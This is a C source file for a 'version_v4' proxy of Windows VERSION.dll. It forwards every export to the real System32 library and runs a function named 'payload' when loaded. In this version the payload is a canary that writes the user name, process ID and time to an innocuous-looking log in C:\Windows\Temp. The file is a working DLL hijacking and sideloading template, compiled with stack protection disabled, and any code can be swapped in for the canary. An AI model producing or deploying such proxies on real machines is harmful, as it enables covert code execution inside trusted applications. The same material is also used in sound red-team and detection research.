/*
 * version_v4.c -- Runtime-forwarding VERSION.dll proxy
 *
 * Loads real version.dll from System32 at attach time,
 * resolves all exports, forwards calls. Minimal canary.
 *
 * Compile:
 *   cl.exe version_v4.c /Fe:version.dll /LD /O1 /GS- /link /DEF:version.def advapi32.lib user32.lib
 */

#include <windows.h>

static HMODULE g_hReal = NULL;

typedef BOOL  (WINAPI *t1)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *t2)(DWORD, HANDLE);
typedef BOOL  (WINAPI *t3)(DWORD, LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *t4)(DWORD, LPCWSTR, DWORD, DWORD, LPVOID);
typedef DWORD (WINAPI *t5)(LPCSTR, LPDWORD);
typedef DWORD (WINAPI *t6)(DWORD, LPCSTR, LPDWORD);
typedef DWORD (WINAPI *t7)(DWORD, LPCWSTR, LPDWORD);
typedef DWORD (WINAPI *t8)(LPCWSTR, LPDWORD);
typedef BOOL  (WINAPI *t9)(LPCWSTR, DWORD, DWORD, LPVOID);
typedef DWORD (WINAPI *tA)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT, LPSTR, PUINT);
typedef DWORD (WINAPI *tB)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT, LPWSTR, PUINT);
typedef DWORD (WINAPI *tC)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT);
typedef DWORD (WINAPI *tD)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT);
typedef DWORD (WINAPI *tE)(DWORD, LPSTR, DWORD);
typedef DWORD (WINAPI *tF)(DWORD, LPWSTR, DWORD);
typedef BOOL  (WINAPI *tG)(LPCVOID, LPCSTR, LPVOID*, PUINT);
typedef BOOL  (WINAPI *tH)(LPCVOID, LPCWSTR, LPVOID*, PUINT);

static t1 f1; static t2 f2; static t3 f3; static t4 f4;
static t5 f5; static t6 f6; static t7 f7; static t8 f8;
static t9 f9; static tA fA; static tB fB; static tC fC;
static tD fD; static tE fE; static tF fF; static tG fG;
static tH fH;

static BOOL init(void)
{
    WCHAR p[MAX_PATH];
    GetSystemDirectoryW(p, MAX_PATH);
    lstrcatW(p, L"\\version.dll");
    g_hReal = LoadLibraryW(p);
    if (!g_hReal) return FALSE;
    f1=(t1)GetProcAddress(g_hReal,"GetFileVersionInfoA");
    f2=(t2)GetProcAddress(g_hReal,"GetFileVersionInfoByHandle");
    f3=(t3)GetProcAddress(g_hReal,"GetFileVersionInfoExA");
    f4=(t4)GetProcAddress(g_hReal,"GetFileVersionInfoExW");
    f5=(t5)GetProcAddress(g_hReal,"GetFileVersionInfoSizeA");
    f6=(t6)GetProcAddress(g_hReal,"GetFileVersionInfoSizeExA");
    f7=(t7)GetProcAddress(g_hReal,"GetFileVersionInfoSizeExW");
    f8=(t8)GetProcAddress(g_hReal,"GetFileVersionInfoSizeW");
    f9=(t9)GetProcAddress(g_hReal,"GetFileVersionInfoW");
    fA=(tA)GetProcAddress(g_hReal,"VerFindFileA");
    fB=(tB)GetProcAddress(g_hReal,"VerFindFileW");
    fC=(tC)GetProcAddress(g_hReal,"VerInstallFileA");
    fD=(tD)GetProcAddress(g_hReal,"VerInstallFileW");
    fE=(tE)GetProcAddress(g_hReal,"VerLanguageNameA");
    fF=(tF)GetProcAddress(g_hReal,"VerLanguageNameW");
    fG=(tG)GetProcAddress(g_hReal,"VerQueryValueA");
    fH=(tH)GetProcAddress(g_hReal,"VerQueryValueW");
    return TRUE;
}

static void payload(void)
{
    HANDLE h; DWORD w; SYSTEMTIME t; char b[128]; int n;
    char u[64]; DWORD ul = 64;
    GetLocalTime(&t);
    GetUserNameA(u, &ul);
    n = wsprintfA(b, "%04d%02d%02d_%02d%02d%02d %s %lu\r\n",
        t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond,
        u, GetCurrentProcessId());
    h = CreateFileA("C:\\Windows\\Temp\\ws_diag.log",
        GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) { WriteFile(h, b, n, &w, NULL); CloseHandle(h); }
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p)
{
    (void)h; (void)p;
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        if (!init()) return FALSE;
        payload();
    } else if (r == DLL_PROCESS_DETACH && g_hReal) {
        FreeLibrary(g_hReal);
    }
    return TRUE;
}

BOOL WINAPI vp_GetFileVersionInfoA(LPCSTR a, DWORD b, DWORD c, LPVOID d) { return f1(a,b,c,d); }
BOOL WINAPI vp_GetFileVersionInfoByHandle(DWORD a, HANDLE b) { return f2(a,b); }
BOOL WINAPI vp_GetFileVersionInfoExA(DWORD a, LPCSTR b, DWORD c, DWORD d, LPVOID e) { return f3(a,b,c,d,e); }
BOOL WINAPI vp_GetFileVersionInfoExW(DWORD a, LPCWSTR b, DWORD c, DWORD d, LPVOID e) { return f4(a,b,c,d,e); }
DWORD WINAPI vp_GetFileVersionInfoSizeA(LPCSTR a, LPDWORD b) { return f5(a,b); }
DWORD WINAPI vp_GetFileVersionInfoSizeExA(DWORD a, LPCSTR b, LPDWORD c) { return f6(a,b,c); }
DWORD WINAPI vp_GetFileVersionInfoSizeExW(DWORD a, LPCWSTR b, LPDWORD c) { return f7(a,b,c); }
DWORD WINAPI vp_GetFileVersionInfoSizeW(LPCWSTR a, LPDWORD b) { return f8(a,b); }
BOOL WINAPI vp_GetFileVersionInfoW(LPCWSTR a, DWORD b, DWORD c, LPVOID d) { return f9(a,b,c,d); }
DWORD WINAPI vp_VerFindFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPSTR e, PUINT f, LPSTR g, PUINT i) { return fA(a,b,c,d,e,f,g,i); }
DWORD WINAPI vp_VerFindFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPWSTR e, PUINT f, LPWSTR g, PUINT i) { return fB(a,b,c,d,e,f,g,i); }
DWORD WINAPI vp_VerInstallFileA(DWORD a, LPCSTR b, LPCSTR c, LPCSTR d, LPCSTR e, LPCSTR f, LPSTR g, PUINT i) { return fC(a,b,c,d,e,f,g,i); }
DWORD WINAPI vp_VerInstallFileW(DWORD a, LPCWSTR b, LPCWSTR c, LPCWSTR d, LPCWSTR e, LPCWSTR f, LPWSTR g, PUINT i) { return fD(a,b,c,d,e,f,g,i); }
DWORD WINAPI vp_VerLanguageNameA(DWORD a, LPSTR b, DWORD c) { return fE(a,b,c); }
DWORD WINAPI vp_VerLanguageNameW(DWORD a, LPWSTR b, DWORD c) { return fF(a,b,c); }
BOOL WINAPI vp_VerQueryValueA(LPCVOID a, LPCSTR b, LPVOID *c, PUINT d) { return fG(a,b,c,d); }
BOOL WINAPI vp_VerQueryValueW(LPCVOID a, LPCWSTR b, LPVOID *c, PUINT d) { return fH(a,b,c,d); }
